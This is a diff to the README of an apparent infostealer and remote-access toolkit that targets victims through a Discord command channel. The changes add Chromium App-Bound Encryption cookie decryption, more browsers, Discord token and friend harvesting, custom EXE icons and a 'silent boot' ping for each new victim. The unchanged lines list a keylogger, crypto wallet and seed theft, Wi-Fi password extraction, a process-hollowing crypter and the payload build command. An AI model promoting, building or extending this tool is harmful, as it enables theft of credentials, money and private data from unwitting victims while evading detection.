@@ -27,12 +27,16 @@
 
 | Browser | Cookies | Passwords | Bookmarks | History | Credit Cards |
 |---------|:-------:|:---------:|:---------:|:-------:|:------------:|
-| Chrome | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
-| Edge | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
-| Brave | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
+| Chrome | ✅ AES-GCM/CBC/v20 ABE | ✅ | ✅ | ✅ | ✅ |
+| Edge | ✅ AES-GCM/CBC/v20 ABE | ✅ | ✅ | ✅ | ✅ |
+| Brave | ✅ AES-GCM/CBC/v20 ABE | ✅ | ✅ | ✅ | ✅ |
 | Opera | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
 | OperaGX | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
+| Vivaldi | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
+| Yandex | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
 | Firefox | ✅ NSS Decrypt | ✅ | ✅ | ✅ | — |
+
+> Chromium v20 (App-Bound Encryption) decrypted per-browser with zero browser kills — live SQLite snapshots, targeted last-resort handling only.
 
 ### Output Formats
 
@@ -66,7 +70,9 @@ cookies/
 |---------|---------|
 | Token extraction | Browser LocalStorage, SessionStorage, Cookies |
 | Token enrichment | Email, Phone, Nitro, Boost, MFA, Badges |
-| HQ Friends | Badge-level friend list |
+| HQ Friends | Badge-level friend list, paginated embeds |
+| Nitro tenure badges | Bronze → Opal (1–72 months), Boost 1–9 |
+| Custom badge emojis | One-click guild emoji registration from the builder |
 | Backup Codes | 2FA backup codes |
 | Billing info | Payment methods, billing country |
 
@@ -83,6 +89,7 @@ cookies/
 | `.tokens` | Re-collect Discord tokens |
 | `.cookies` | Re-collect browser cookies |
 | `.passwords` | Re-collect browser passwords |
+| `.friend [full] [N]` | Full friends list, rarest first, button pages |
 | `.keylog start` | Start live keylogger |
 | `.keylog dump` | Download keylog |
 | `.ps` | List processes |
@@ -113,6 +120,8 @@ cookies/
 | Keylogger | `GetAsyncKeyState` with state tracking |
 | Screen Recording | FFmpeg GDIGRAB → MP4 → GoFile |
 | Cookie Decryption | AES-256-GCM (v10), AES-128-CBC, AES-256-GCM (v20 ABE) |
+| Silent boot | @everyone ping only on new victim channel, English C2 |
+| Custom EXE icon | Pick .ico/.png in the builder, embedded at compile time |
 | Wi-Fi Extraction | `netsh wlan show profiles` + password decrypt |
 | Wallet Stealing | Browser extension wallets, local wallet files |
 | Crypto Seeds | Mnemonic phrase detection |
@@ -166,7 +175,7 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o ../payload.exe
 
 | Component | Technology |
 |-----------|------------|
-| Payload | Go 1.25, Windows API, XOR obfuscation |
+| Payload | Go 1.25, Windows API, XOR obfuscation, hackbrowserdata engine |
 | Crypter | AES-256-GCM, Process Hollowing (RunPE) |
 | Build Pipeline | Python, pefile, zipfile |
 | Desktop UI | Flet (Flutter for Python) |
